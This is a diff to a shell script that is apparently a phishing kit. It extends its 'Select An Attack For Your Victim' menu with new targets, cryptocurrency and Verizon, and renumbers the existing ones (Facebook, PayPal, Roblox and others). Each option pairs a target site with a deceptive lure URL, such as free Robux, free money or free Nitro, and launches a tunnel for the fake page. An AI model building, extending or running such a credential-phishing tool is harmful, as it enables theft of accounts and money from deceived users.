@@ -710,11 +710,21 @@ main_menu() {
 	cat <<- EOF
 		${MAGENTA}[${CYAN}::${MAGENTA}]${BLUE} Select An Attack For Your Victim ${MAGENTA}[${CYAN}::${MAGENTA}]${BLUE}
 
-		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Facebook		${MAGENTA}[${CYAN}05${MAGENTA}]${BLUE} Paypal		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Xbox
-		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Instagram		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Tiktok		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} GitHub
-		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Google		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Snapchat		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Discord
-		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Microsoft		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Spotify		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Roblox
-
+		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Facebook
+		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Instagram
+		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Google
+		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Cryto
+		${MAGENTA}[${CYAN}05${MAGENTA}]${BLUE} Microsoft
+		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Paypal
+		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Tiktok
+		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Snapchat
+		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Spotify
+		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} Xbox
+		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Github
+		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Discord
+		${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Roblox
+		${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Verizon
+		
 		${MAGENTA}[${CYAN}99${MAGENTA}]${BLUE} About         ${MAGENTA}[${CYAN}00${MAGENTA}]${BLUE} Exit
 
 	EOF
@@ -728,41 +738,49 @@ main_menu() {
 			site_instagram;;
 		3 | 03)
 			site_gmail;;
-		4 | 04)
+		4| 04)
+			website="cryptocurrency"
+			mask='https://get-free-cryto'
+			tunnel_menu;;
+		5 | 05)
 			website="microsoft"
 			mask='https://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
-		5 | 05)
+		6 | 06)
 			website="paypal"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		6 | 06)
+		7 | 07)
 			website="tiktok"
 			mask='https://tiktok-free-liker'
 			tunnel_menu;;
-		7 | 07)
+		8 | 08)
 			website="snapchat"
 			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
-		8 | 08)
+		9 | 09)
 			website="spotify"
 			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
-		9 | 09)
+		10)
 			website="xbox"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		10)
+		11)
 			website="github"
 			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
-		11)
+		12)
 			website="discord"
 			mask='https://get-discord-nitro-free'
 			tunnel_menu;;
-		12)
+		13)
 			website="roblox"
 			mask='https://get-free-robux'
+			tunnel_menu;;
+		14)
+			website="verizon"
+			mask='https://get-unlimited-data'
 			tunnel_menu;;
 		99)
 			about;;
